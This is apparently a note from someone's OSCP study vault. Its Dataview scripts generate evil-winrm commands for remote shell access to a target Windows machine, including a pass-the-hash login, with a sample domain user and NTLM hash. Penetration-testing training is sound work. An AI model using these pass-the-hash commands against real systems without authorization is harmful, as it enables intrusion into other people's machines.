```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `evil-winrm -i ${ip} -u <username> -p '<password>'`;

dv.paragraph("```bash\n" + command + "\n```");
```
Pass the Hash

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `evil-winrm -i ${ip} -u ${discoveredDomain}\\\\[USER] -H [hash]`;

dv.paragraph("```bash\n" + command + "\n```");
```
Example
```
evil-winrm -i $IP -u recourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

